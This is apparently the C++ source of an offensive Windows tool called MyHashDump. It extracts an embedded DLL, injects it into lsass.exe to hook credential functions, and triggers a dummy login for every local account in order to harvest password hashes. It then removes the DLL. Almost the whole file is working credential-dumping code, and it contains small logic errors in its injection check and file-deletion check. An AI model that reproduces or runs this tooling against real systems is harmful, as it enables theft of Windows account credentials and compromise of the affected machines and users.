#include <Windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <iostream> // std::cin
#include <LM.h>

#include "MyHashDump.h"
#include "utils/debug.h"
#include "utils/utils.h"
#include "utils/dllinjection.h"
#include "shared.h"
#include "resource.h"
#include "utils/getopt.h"

MyHashDump::MyHashDump()
{
	threadHandle = NULL;
	started = false;
}

std::vector<std::wstring> MyHashDump::getLocalUsers()
{
	std::vector<std::wstring> retUsers;

	LPUSER_INFO_0 pBuf = NULL, pTempBuf = NULL;
	DWORD numUsers = 0;
	DWORD totalUsers = 0;

	NET_API_STATUS nStatus = NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH, &numUsers, &totalUsers, NULL);
	if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
		if ((pTempBuf = pBuf) != NULL) {
			for (int i = 0; i < numUsers; i++) {
				std::wstring currUser = std::wstring(pTempBuf->usri0_name, pTempBuf->usri0_name + wcslen(pTempBuf->usri0_name));
				if (currUser.size() > 0) {
					retUsers.push_back(currUser);
					//printf("testing: %S\n", currUser.c_str());
				}

				pTempBuf++;
			}
		}
	}

	if (pBuf)
		NetApiBufferFree(pBuf);

	return retUsers;
}

void MyHashDump::spoofLogins(std::vector<std::wstring> users)
{
	for (std::wstring user : users) {
		std::string cuser = convertWstringToCstring(user);
		HANDLE token = NULL;
		BOOL ok = LogonUserA(cuser.c_str(), NULL, "testpassword", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &token);
		//if (ok == FALSE) {
		//	printf("\tError 0x%x, %d\n", GetLastError(), GetLastError());
		//}

	}
}

void MyHashDump::start(DWORD pid, std::string path)
{
	if (started == false) {
		ioPipes.init(input_pipe_name, output_pipe_name, input_event_name, output_event_name);
		ioPipes.start();

		injector(path.c_str(), pid, "dllentry");

		started = true;
	}
	else {
		DebugFprintf(outlogfile, PRINT_INFO1, "MyHashDump already started...stop and then start again\n");
	}
}

void MyHashDump::stop(DWORD pid, std::string path)
{
	if (started == true) {
		writeToInput("exit");
		Sleep(1000);

		ejector(path.c_str(), pid);

		ioPipes.stop();

		started = false;
	}
	else {
		DebugFprintf(outlogfile, PRINT_INFO1, "Nothing to stop\n");
	}
}

bool MyHashDump::injector(const char* dllFullPath, DWORD pid, const char* functionName)
{
	HANDLE retThreadHandle = NULL;
	SOCKET retSocket = INVALID_SOCKET;

	printf("Starting process injection\n");
	threadHandle = nt_inject_and_run(dllFullPath, pid, functionName);
	//retThreadHandle = inject_and_run(dllFullPath, pid, functionName);
	if (retThreadHandle == NULL) {
		printf("Error nt_inject_and_run\n");
		return false;
	}

	//Give injected process time to start up
	Sleep(1000);

	return true;
}

bool MyHashDump::ejector(const char* dllFullPath, DWORD pid)
{
	//wait for thread to shutdown
	printf("waiting for inejcted dll thread to return\n");
	DWORD ret = WaitForSingleObject(threadHandle, INFINITE);
	Sleep(1000); //Bad hack to prevent unloading DLL too soon

	switch (ret) {
	case WAIT_OBJECT_0:
		//remove injected dll from target process
		printf("Cleaning up target process (%d).\n", pid);
		if (confirmationPrompt())
			cleanupRemoteProcess(pid, dllFullPath);
		break;
	case WAIT_TIMEOUT:
		printf("10 seconds wait is over... not safe to remove dll. Try again if you want\n");
		break;
	default:
		printf("Failed to WaitForSingleObject: 0x%x\n", GetLastError());
		printf("Force remove of injected DLL?\n");
		if (confirmationPrompt())
			cleanupRemoteProcess(pid, dllFullPath);
		break;
	}

	return true;
}

void MyHashDump::writeToInput(std::string inputcmd)
{
	std::vector<uint8_t> test = std::vector<uint8_t>(inputcmd.begin(), inputcmd.begin() + inputcmd.size());
	ioPipes.writeToInput(test);
}

void write_dll(std::string dest)
{
	HANDLE hFile = CreateFile(dest.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DbgFprintf(outlogfile, PRINT_ERROR, "[-] Unable to create file '%s' Code: %d\n", dest.c_str(), GetLastError());
		return;
	}

	//Get the resource
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCEA(IDR_BIN1), "BIN1");
	if (hRes == NULL) {
		DbgFprintf(outlogfile, PRINT_ERROR, "[-] Unable to find resource. Code: %d\n", GetLastError());
		return;
	}

	HGLOBAL hResourceLoaded = LoadResource(NULL, hRes);
	if (hResourceLoaded == NULL) {
		DbgFprintf(outlogfile, PRINT_ERROR, "[-] Unable to load resource. Code: %d\n", GetLastError());
		return;
	}

	char* lpResLock = (char*)LockResource(hResourceLoaded);
	DWORD dwSizeRes = SizeofResource(NULL, hRes);

	//Write file if not zero
	if (!dwSizeRes)
		return;

	//Allocate memory
	char* buf = (char*)malloc(dwSizeRes);
	if (buf == NULL)
		return;

	memcpy(buf, lpResLock, dwSizeRes);

	DWORD dwRet = 0;
	if (!WriteFile(hFile, buf, dwSizeRes, &dwRet, NULL)) {
		DbgFprintf(outlogfile, PRINT_ERROR, "[-] Error writing file. Code: %d\n", GetLastError());
		free(buf);
		return;
	}

	//Free mem
	free(buf);

	//CLose handle and free resource
	dwRet = CloseHandle(hFile);
	FreeResource(hResourceLoaded);
}

BOOL remove_dll(std::string dest)
{
	//Remove the DLL
	if (DeleteFile(dest.c_str())) {
		DbgFprintf(outlogfile, PRINT_ERROR, "[-] Error deleting file. Code: %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

void interactive_mode(MyHashDump& hashdump, DWORD pid, std::string path)
{
	std::string line = "";
	printf("# ");

	while (line.compare("exit") != 0 && std::getline(std::cin, line)) {
		if (line.size() > 0) {
			std::vector<std::string> line_split = splitStr(line, " ");
			if (line_split[0].compare("exit") == 0) {
				DebugFprintf(outlogfile, PRINT_INFO1, "Exiting MyHashDump...\n");
				continue;
			}
			else if (line_split[0].compare("start") == 0) {
				hashdump.start(pid, path);
			}
			else if (line_split[0].compare("stop") == 0) {
				hashdump.stop(pid, path);
			}
			else if (line_split[0].compare("input") == 0) {
				if(line_split.size() > 1 && line_split[1].size() > 0)
					hashdump.writeToInput(line_split[1]);
			}
			else
				printf("not a supported command: %s\n", line.c_str());
		}
		printf("# ");
	}
}

void usage()
{
	printf("\nMyHashDump - Use function hook in lsass.exe to gather password hashes\n\n");
	printf("Usage:\n");
	printf("   -h              print usage menu\n");
	printf("   -i              interactive\n");
	printf("   -p pid          process id for lsass.exe\n");
}

int main(int argc, char** argv)
{
	printf("MyHashDump\n");

	DWORD pid = 0;
	bool interactive = false;

	//argument parsing
	int c = 0;
	while ((c = getopt(argc, argv, "p:i")) != -1) {

		switch (c) {
		case 'h':
			usage();
			return 1;
		case 'p':
			if (optarg != NULL)
				pid = atoi(optarg);
			break;
		case 'i':
			interactive = true;
			break;
		case '?':
			printf("\n[-] Unrecognized option: %c\n\n", c);
			usage();
			return -1;
		default:
			printf("\n[-] Unrecognized option: %c\n\n", c);
			usage();
			return -1;
		}
	}

	if (pid == 0) {
		printf("Need to specify lsass.exe process id\n");
		return -1;
	}

	// write injection payload to disk
	char curDir[MAX_PATH] = { 0 };
	DWORD len = MAX_PATH;
	DWORD ret = GetCurrentDirectoryA(len, curDir);
	std::string path = std::string(curDir);
	path = path + "\\Slice.dll";
	write_dll(path);

	MyHashDump hashdump;
	std::vector<std::wstring> users = hashdump.getLocalUsers();

	if(interactive == true)
		interactive_mode(hashdump, pid, path);
	else {
		hashdump.start(pid, path);
		Sleep(1000);
		hashdump.spoofLogins(users);
		Sleep(1000);
	}

	hashdump.stop(pid, path);

	remove_dll(path);

#ifdef _DEBUG
	_CrtDumpMemoryLeaks();
#endif

	return 0;
}